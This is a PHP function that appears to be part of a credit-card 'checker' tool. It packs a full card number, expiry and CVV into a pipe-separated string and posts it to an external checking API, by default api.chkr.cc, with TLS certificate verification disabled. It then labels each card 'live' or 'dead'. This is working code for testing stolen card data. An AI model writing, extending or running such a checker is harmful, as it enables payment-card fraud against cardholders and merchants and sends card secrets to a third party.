<?php
function checkCardStatus(string $cardNumber, string $expiry, string $cvv): array {
    $enabled = getSetting('checker_enabled');
    if ($enabled !== '1') return ['status' => 'unknown', 'message' => 'Checker is disabled'];

    $apiUrl = getSetting('checker_api_url') ?: 'https://api.chkr.cc/';
    $apiToken = getSetting('checker_api_token') ?: '';

    $cleanNumber = preg_replace('/\D/', '', $cardNumber);
    $parts = explode('/', $expiry);
    $month = str_pad(trim($parts[0] ?? ''), 2, '0', STR_PAD_LEFT);
    $year = trim($parts[1] ?? '');
    if (strlen($year) === 2) $year = '20' . $year;

    $ccData = "{$cleanNumber}|{$month}|{$year}|{$cvv}";

    $headers = ['Content-Type: application/json'];
    if ($apiToken) $headers[] = "token: {$apiToken}";

    $ch = curl_init($apiUrl);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode(['data' => $ccData]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if (!$response) {
        return ['status' => 'unknown', 'message' => 'API request failed'];
    }

    $data = json_decode($response, true);
    if (!$data) {
        return ['status' => 'unknown', 'message' => 'Invalid API response'];
    }

    $status = 'unknown';
    if (isset($data['code'])) {
        $status = $data['code'] == 1 ? 'live' : ($data['code'] == 0 ? 'dead' : 'unknown');
    } elseif (isset($data['status'])) {
        $s = strtolower($data['status']);
        $status = in_array($s, ['live', 'approved', 'valid']) ? 'live' : (in_array($s, ['die', 'dead', 'declined', 'invalid']) ? 'dead' : 'unknown');
    }

    return [
        'status' => $status,
        'message' => $data['message'] ?? $data['status'] ?? 'Unknown',
        'raw' => $data,
    ];
}
